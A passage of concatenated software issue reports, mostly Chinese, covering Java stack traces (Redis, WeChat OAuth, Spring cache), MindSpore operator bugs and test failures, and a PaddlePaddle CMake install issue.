org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory$ExceptionTranslatingConnectionProvider.translateException(LettuceConnectionFactory.java:1534) at org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory$ExceptionTranslatingConnectionProvider.getConnection(LettuceConnectionFactory.java:1442) at org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory$SharedConnection.getNativeConnection(LettuceConnectionFactory.java:1228) at org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory$SharedConnection.getConnection(LettuceConnectionFactory.java:1211) at org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory.getSharedReactiveConnection(LettuceConnectionFactory.java:985) at org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory.getReactiveConnection(LettuceConnectionFactory.java:446) at org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory.getReactiveConnection(LettuceConnectionFactory.java:99) at reactor.core.publisher.MonoSupplier.call(MonoSupplier.java:85) at reactor.core.publisher.FluxSubscribeOnCallable$CallableSubscribeOnSubscription.run(FluxSubscribeOnCallable.java:225) at reactor.core.scheduler.SchedulerTask.call(SchedulerTask.java:68) at reactor.core.scheduler.SchedulerTask.call(SchedulerTask.java:28) at java.util.concurrent.FutureTask.run(FutureTask.java:266) at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$201(ScheduledThreadPoolExecutor.java:180) at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:293) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:745) at io.lettuce.core.RedisConnectionException.create(RedisConnectionException.java:78) at io.lettuce.core.RedisConnectionException.create(RedisConnectionException.java:56) at io.lettuce.core.AbstractRedisClient.getConnection(AbstractRedisClient.java:242) at io.lettuce.core.RedisClient.connect(RedisClient.java:206) at org.springframework.data.redis.connection.lettuce.StandaloneConnectionProvider.lambda$getConnection$1(StandaloneConnectionProvider.java:115) at java.util.Optional.orElseGet(Optional.java:267) at org.springframework.data.redis.connection.lettuce.StandaloneConnectionProvider.getConnection(StandaloneConnectionProvider.java:115) at org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory$ExceptionTranslatingConnectionProvider.getConnection(LettuceConnectionFactory.java:1440) ... 15 common frames omitted at java.net.Inet6AddressImpl.lookupAllHostAddr(Native Method) at java.net.InetAddress$2.lookupAllHostAddr(InetAddress.java:928) at java.net.InetAddress.getAddressesFromNameService(InetAddress.java:1323) at java.net.InetAddress.getAllByName0(InetAddress.java:1276) at java.net.InetAddress.getAllByName(InetAddress.java:1192) at java.net.InetAddress.getAllByName(InetAddress.java:1126) at java.net.InetAddress.getByName(InetAddress.java:1076) at io.netty.util.internal.SocketUtils$8.run(SocketUtils.java:156) at io.netty.util.internal.SocketUtils$8.run(SocketUtils.java:153) at java.security.AccessController.doPrivileged(Native Method) at io.netty.util.internal.SocketUtils.addressByName(SocketUtils.java:153) at io.netty.resolver.DefaultNameResolver.doResolve(DefaultNameResolver.java:41) at io.netty.resolver.SimpleNameResolver.resolve(SimpleNameResolver.java:61) at io.netty.resolver.SimpleNameResolver.resolve(SimpleNameResolver.java:53) at io.netty.resolver.InetSocketAddressResolver.doResolve(InetSocketAddressResolver.java:55) at io.netty.resolver.InetSocketAddressResolver.doResolve(InetSocketAddressResolver.java:31) at io.netty.resolver.AbstractAddressResolver.resolve(AbstractAddressResolver.java:106) at io.netty.bootstrap.Bootstrap.doResolveAndConnect0(Bootstrap.java:206) at io.netty.bootstrap.Bootstrap.access$000(Bootstrap.java:46) at io.netty.bootstrap.Bootstrap$1.operationComplete(Bootstrap.java:180) at io.netty.bootstrap.Bootstrap$1.operationComplete(Bootstrap.java:166) at io.netty.util.concurrent.DefaultPromise.notifyListener0(DefaultPromise.java:578) at io.netty.util.concurrent.DefaultPromise.notifyListenersNow(DefaultPromise.java:552) at io.netty.util.concurrent.DefaultPromise.notifyListeners(DefaultPromise.java:491) at io.netty.util.concurrent.DefaultPromise.setValue0(DefaultPromise.java:616) at io.netty.util.concurrent.DefaultPromise.setSuccess0(DefaultPromise.java:605) at io.netty.util.concurrent.DefaultPromise.trySuccess(DefaultPromise.java:104) at io.netty.channel.DefaultChannelPromise.trySuccess(DefaultChannelPromise.java:84) at io.netty.channel.AbstractChannel$AbstractUnsafe.safeSetSuccess(AbstractChannel.java:1000) at io.netty.channel.AbstractChannel$AbstractUnsafe.register0(AbstractChannel.java:504) at io.netty.channel.AbstractChannel$AbstractUnsafe.access$200(AbstractChannel.java:417) at io.netty.channel.AbstractChannel$AbstractUnsafe$1.run(AbstractChannel.java:474) at io.netty.util.concurrent.AbstractEventExecutor.safeExecute(AbstractEventExecutor.java:164) at io.netty.util.concurrent.SingleThreadEventExecutor.runAllTasks(SingleThreadEventExecutor.java:472) at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:500) at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989) at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74) at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) ... 1 common frames omitted"
cloud h5调用2次登陆，第二次后端报code已用,"/yshopapi/auth/oauth/wechatLogin?code=031alGFa1zE9aB0HMLFa1pfUax3alGFb&amp;spread=&amp;login_type= 后端报错信息   <code>: me.chanjar.weixin.common.error.WxErrorException: 错误代码：40163, 错误信息：code been used, hints: [ req_id: XjBCDbwgE-2XFuGA ]，微信原始报文：{""errcode"":40163,""errmsg"":""code been used, hints: [ req_id: XjBCDbwgE-2XFuGA ]""} at me.chanjar.weixin.common.util.http.SimpleGetRequestExecutor.handleResponse(SimpleGetRequestExecutor.java:46) at me.chanjar.weixin.common.util.http.apache.ApacheSimpleGetRequestExecutor.execute(ApacheSimpleGetRequestExecutor.java:42) at me.chanjar.weixin.common.util.http.apache.ApacheSimpleGetRequestExecutor.execute(ApacheSimpleGetRequestExecutor.java:21) at me.chanjar.weixin.mp.api.impl.WxMpOAuth2ServiceImpl.getOAuth2AccessToken(WxMpOAuth2ServiceImpl.java:41) at me.chanjar.weixin.mp.api.impl.WxMpOAuth2ServiceImpl.getAccessToken(WxMpOAuth2ServiceImpl.java:55) at me.chanjar.weixin.mp.api.impl.WxMpOAuth2ServiceImpl.getAccessToken(WxMpOAuth2ServiceImpl.java:50) at co.yixiang.weixin.biz.service.WxOauthService.wxMpOauthService(WxOauthService.java:59) at co.yixiang.weixin.biz.controller.WeixinOauthController.wxMpOauth(WeixinOauthController.java:35) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) at java.lang.reflect.Method.invoke(Unknown Source) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:197) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:141) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:894) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1063) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898)"
【众智】【计算-GPU开发】PopulationCount,"接口目录：mindspore/ops/operations/other_ops.py 接口参考库上： https://www.mindspore.cn/docs/api/zh-CN/r1.6/api_python/ops/mindspore.ops.PopulationCount.html?highlight=populationcount#mindspore.ops.PopulationCount x y 对应底层算子 Classify Name Type Type Range Required INPUT x int16, uint16 TRUE OUTPUT y unit8 TRUE 标杆接口参考 Tensorflow接口： https://www.tensorflow.org/versions/r2.6/api_docs/python/tf/raw_ops/PopulationCount?hl=en 3. 异常处理 4. 算子反向 无反向算子   <code>: 对张量中每个元素的population计数 (也称作popcount, bitsum, bitcount)。 规则为：将元素转换为二进制后， 计算二进制表示里的'1'的个数。 class PopulationCount(PrimitiveWithInfer):"
Ascend动态图模式与其他三种运行模式输出不一致,"上述代码，Ascend动态图模式下的输出和其他三种模式（cpu静态图、cpu动态图、Ascend静态图）不一致 CPU静态图： /mode graph   <code>: import mindspore as ms from mindspore import nn, ops, Tensor, context, Parameter import numpy as np # context.set_context(mode=context.GRAPH_MODE, device_target=""CPU"") # context.set_context(mode=context.PYNATIVE_MODE, device_target=""CPU"") # context.set_context(mode=context.GRAPH_MODE, device_target=""Ascend"") # context.set_context(mode=context.PYNATIVE_MODE, device_target=""Ascend"") np.random.seed(0) x_input = ms.Tensor(np.random.random((1, 2048,4,4)), ms.float32) ww = ms.Tensor(np.random.random((2048,512,3,3)), ms.float32) * 1 size=4 func = nn.Conv2d(in_channels=512*size, out_channels=512*size, kernel_size=3, stride=1, pad_mode=""pad"", padding=1, dilation=1, group=size, has_bias=False, weight_init=Tensor(np.ones((512*size, 512, 3, 3)), ms.float32)) all_conv_weight = func.trainable_params() ops.Assign()(all_conv_weight[0], Parameter(ww)) out = func(x_input) print(out)"
启动创建cacheManager  的时候报空指针错误,"错误堆栈   <code>: 2022-03-05 17:07:44.237 INFO 35372 --- [ main] o.apache.catalina.core.StandardService : Stopping service [Tomcat] 2022-03-05 17:07:44.298 INFO 35372 --- [ main] ConditionEvaluationReportLoggingListener : Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 2022-03-05 17:07:44.433 ERROR 35372 --- [ main] o.s.boot.SpringApplication : Application run failed org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'systemApi' defined in file [G:\ruoyi\img-manager-server1\juanwang\server\api\build\classes\java\main\cn\surveyking\server\api\SystemApi.class]: Unsatisfied dependency expressed through constructor parameter 0; nested exception is org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'systemServiceImpl' defined in file [G:\ruoyi\img-manager-server1\juanwang\server\rdbms\build\classes\java\main\cn\surveyking\server\impl\SystemServiceImpl.class]: Unsatisfied dependency expressed through constructor parameter 2; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'cacheManager' defined in class path resource [cn/surveyking/server/core/config/CacheConfig.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.cache.CacheManager]: Factory method 'cacheManager' threw exception; nested exception is java.lang.NullPointerException at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:800) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:229) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1372) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1222) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:582) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:542) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:953) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:918) ~[spring-context-5.3.15.jar:5.3.15] at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:583) ~[spring-context-5.3.15.jar:5.3.15] at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:145) ~[spring-boot-2.6.3.jar:2.6.3] at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:732) [spring-boot-2.6.3.jar:2.6.3] at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:414) [spring-boot-2.6.3.jar:2.6.3] at org.springframework.boot.SpringApplication.run(SpringApplication.java:302) [spring-boot-2.6.3.jar:2.6.3] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1303) [spring-boot-2.6.3.jar:2.6.3] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1292) [spring-boot-2.6.3.jar:2.6.3] at cn.surveyking.server.SurveyServerApplication.main(SurveyServerApplication.java:18) [main/:na] Caused by: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'systemServiceImpl' defined in file [G:\ruoyi\img-manager-server1\juanwang\server\rdbms\build\classes\java\main\cn\surveyking\server\impl\SystemServiceImpl.class]: Unsatisfied dependency expressed through constructor parameter 2; nested exception is org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'cacheManager' defined in class path resource [cn/surveyking/server/core/config/CacheConfig.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.cache.CacheManager]: Factory method 'cacheManager' threw exception; nested exception is java.lang.NullPointerException at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:800) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.ConstructorResolver.autowireConstructor(ConstructorResolver.java:229) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.autowireConstructor(AbstractAutowireCapableBeanFactory.java:1372) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1222) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:582) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:542) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1389) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1309) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:887) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:791) ~[spring-beans-5.3.15.jar:5.3.15] ... 19 common frames omitted Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name 'cacheManager' defined in class path resource [cn/surveyking/server/core/config/CacheConfig.class]: Bean instantiation via factory method failed; nested exception is org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.cache.CacheManager]: Factory method 'cacheManager' threw exception; nested exception is java.lang.NullPointerException at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:658) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.ConstructorResolver.instantiateUsingFactoryMethod(ConstructorResolver.java:486) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.instantiateUsingFactoryMethod(AbstractAutowireCapableBeanFactory.java:1352) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBeanInstance(AbstractAutowireCapableBeanFactory.java:1195) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:582) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:542) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.AbstractBeanFactory.lambda$doGetBean$0(AbstractBeanFactory.java:335) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:234) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:333) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:208) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.config.DependencyDescriptor.resolveCandidate(DependencyDescriptor.java:276) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.DefaultListableBeanFactory.doResolveDependency(DefaultListableBeanFactory.java:1389) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.DefaultListableBeanFactory.resolveDependency(DefaultListableBeanFactory.java:1309) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.ConstructorResolver.resolveAutowiredArgument(ConstructorResolver.java:887) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.ConstructorResolver.createArgumentArray(ConstructorResolver.java:791) ~[spring-beans-5.3.15.jar:5.3.15] ... 33 common frames omitted Caused by: org.springframework.beans.BeanInstantiationException: Failed to instantiate [org.springframework.cache.CacheManager]: Factory method 'cacheManager' threw exception; nested exception is java.lang.NullPointerException at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:185) ~[spring-beans-5.3.15.jar:5.3.15] at org.springframework.beans.factory.support.ConstructorResolver.instantiate(ConstructorResolver.java:653) ~[spring-beans-5.3.15.jar:5.3.15] ... 47 common frames omitted Caused by: java.lang.NullPointerException: null at cn.surveyking.server.core.config.CacheConfig.cacheManager(CacheConfig.java:61) ~[main/:na] at cn.surveyking.server.core.config.CacheConfig$$EnhancerBySpringCGLIB$$21c05b6b.CGLIB$cacheManager$1(&lt;generated&gt;) ~[main/:na] at cn.surveyking.server.core.config.CacheConfig$$EnhancerBySpringCGLIB$$21c05b6b$$FastClassBySpringCGLIB$$35746a8.invoke(&lt;generated&gt;) ~[main/:na] at org.springframework.cglib.proxy.MethodProxy.invokeSuper(MethodProxy.java:244) ~[spring-core-5.3.15.jar:5.3.15] at org.springframework.context.annotation.ConfigurationClassEnhancer$BeanMethodInterceptor.intercept(ConfigurationClassEnhancer.java:331) ~[spring-context-5.3.15.jar:5.3.15] at cn.surveyking.server.core.config.CacheConfig$$EnhancerBySpringCGLIB$$21c05b6b.cacheManager(&lt;generated&gt;) ~[main/:na] at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_191] at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:1.8.0_191] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_191] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_191] at org.springframework.beans.factory.support.SimpleInstantiationStrategy.instantiate(SimpleInstantiationStrategy.java:154) ~[spring-beans-5.3.15.jar:5.3.15] ... 48 common frames omitted Disconnected from the target VM, address: '127.0.0.1:63954', transport: 'socket' Process finished with exit code 1"
Should not write file to CMAKE_INSTALL_PREFIX when configuration,"https://github.com/PaddlePaddle/Paddle/blob/d54ad9f1a49fe81d226dc5459ab4e67dbdd06d38/cmake/inference_lib.cmake#L176-L185 This line will write files to CMAKE_INSTALL_PREFIX, which is not the good way to install file. Use command of . This lines will make Paddle failed to compile when the user has no write permission to CMAKE_INSTALL_PREFIX.   <code>: install cmake"
[CT][MS][OP] eigh has some problems at CPU and GPU,": CPU GPU /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_eigh_a_input_1d_error test_eigh_a_input_4d_error test_eigh_a_shape_6x8_error test_eigh_eigvals_only_type_true test_eigh_input_b_not_tensor_error test_eigh_input_lower_not_bool_error 等等 在CPU环境执行测试用例 1，test_eigh_a_input_1d_error、test_eigh_a_input_4d_error 输入shape为1d时，报错信息不明确；输入为3d、4d、5d等 报错信息错误，shape形状都没有写正确 2，test_eigh_a_shape_6x8_error，当输入为2d，但shape错误时，报错信息中没有明确指出是那个参数错误，同时也没有给出正常数据的说明或例子 3，test_eigh_eigvals_only_type_true ，当eigvals_only=True时，测试用例出现错误，错误原因看不懂 4，test_eigh_input_b_not_tensor_error，当b取值错误时，捕获不到异常，测试用例竟可以正常通过 5，b，lower，eigvals_only，_type，overwrite_a，overwrite_b，check_finite，turbo，eigvals等参数，都不能捕获 类型异常的错误 6，eigh算子支持的数据类型有哪些呢？ 当input_a的Tensor类型为float16、int8、int16、int32、int64时， print(mnp.sum(mnp.dot(A, v) - mnp.dot(v, mnp.diag(w))) &lt; 1e-10)会出现错误。 对应的forward_cmp也不能比较 7，在GPU环境，会额外出现AssertionError错误 test_eigh_a_shape_4x4_dtype_fp32 test_eigh_a_dtype_fp64 test_eigh_a_input_2d_dtype_fp32 test_eigh_lower_type_false test_eigh_type_type_2 test_eigh_lower_type_false_overwrite_a_true test_eigh_lower_type_false_overwrite_a_true_overwrite_b_true test_eigh_check_finite_type_false test_eigh_lower_type_false_turbo_false test_eigh_eigvals_3x8 test_eigh_lower_false_overwrite_a_true_overwrite_b_true_turbo_false 等等 1，解决上述七个错误   <code>: def test_eigh_a_input_1d_error(): input_a = Tensor(np.random.randn(64, ), dtype=mstype.float32) fact = EighMock(attributes={'a': input_a}) #with pytest.raises(RuntimeError): &gt; fact.forward_mindspore_impl() E RuntimeError: mindspore/ccsrc/backend/kernel_compiler/cpu/eigen/eigh_cpu_kernel.cc:50 InitKernel] wrong array shape, A should be a matrix, but got [64 X 0] def test_eigh_a_input_4d_error(): input_a = Tensor(np.random.randn(6, 6, 6, 6), dtype=mstype.float32) fact = EighMock(attributes={'a': input_a}) # with pytest.raises(RuntimeError): &gt; fact.forward_mindspore_impl() test_eigh.py:224: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/eigh_ops.py:55: in forward_mindspore_impl eigvals=self.eigvals) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/scipy/linalg.py:405: in eigh return eigh_net(a) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:477: in __call__ out = self.compile_and_run(*args) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:802: in compile_and_run self.compile(*inputs) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:789: in compile _cell_graph_executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._CellGraphExecutor object at 0x7fb0adfbdad0&gt;, obj = EighNet&lt;&gt;, phase = 'train.1642400862930836224.140390454106832.9' do_convert = True, auto_parallel_mode = False args = (Tensor(shape=[6, 6, 6, 6], dtype=Float32, value= [[[[-1.46116602e+00, 7.65667975e-01, -8.99886668e-01, 1.25077939e+...8e-01], [-9.29541707e-01, -8.57796848e-01, 2.56863046e+00, 1.11657095e+00, 1.94889188e+00, -1.43698573e+00]]]]),) def compile(self, obj, *args, phase='predict', do_convert=True, auto_parallel_mode=False): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance need compile. args (tuple): Function or cell input arguments. phase (str): The name of compile phase. Default: 'predict'. do_convert (bool): When set to True, convert ME graph to GE graph after compiling graph. auto_parallel_mode: When set to True, use auto parallel mode to compile graph. Return: Str, the full phase of the cell. Bool, if the graph has been compiled before, return False, else return True. """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden else: self.enable_tuple_broaden = False self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) is_sink_mode = args and isinstance(args[0], Tensor) and args[0].virtual_flag if auto_parallel_mode and _need_to_full() and not is_sink_mode and obj.auto_parallel_compile_and_run(): args_list = _to_full_tensor(args, _get_device_num(), _get_global_rank()) enable_ge = context.get_context(""enable_ge"") self._graph_executor.set_weights_values(obj.parameters_dict()) &gt; result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) E RuntimeError: mindspore/ccsrc/backend/kernel_compiler/cpu/eigen/eigh_cpu_kernel.cc:50 InitKernel] wrong array shape, A should be a matrix, but got [6 X 6] def test_eigh_a_shape_6x8_error(): input_a = Tensor(np.random.randn(6, 8), dtype=mstype.float32) fact = EighMock(attributes={'a': input_a}) # with pytest.raises(RuntimeError): &gt; fact.forward_mindspore_impl() test_eigh.py:245: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/eigh_ops.py:55: in forward_mindspore_impl eigvals=self.eigvals) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/scipy/linalg.py:405: in eigh return eigh_net(a) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:477: in __call__ out = self.compile_and_run(*args) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:802: in compile_and_run self.compile(*inputs) /root/miniconda3/envs/xue3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:789: in compile _cell_graph_executor.compile(self, *inputs, phase=self.phase, auto_parallel_mode=self._auto_parallel_mode) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._CellGraphExecutor object at 0x7fb0adfbdad0&gt;, obj = EighNet&lt;&gt;, phase = 'train.1642400863015547392.140390454128464.10' do_convert = True, auto_parallel_mode = False args = (Tensor(shape=[6, 8], dtype=Float32, value= [[-3.94719392e-01, 6.70869052e-01, -4.98808742e-01 ... -1.49775696e+00, -...52e-02], [-3.22236776e-01, -1.48548090e+00, -4.54312027e-01 ... -1.05444193e+00, 1.34906471e+00, 2.47299820e-01]]),) def compile(self, obj, *args, phase='predict', do_convert=True, auto_parallel_mode=False): """""" Compiles graph. Args: obj (Function/Cell): The function or cell instance 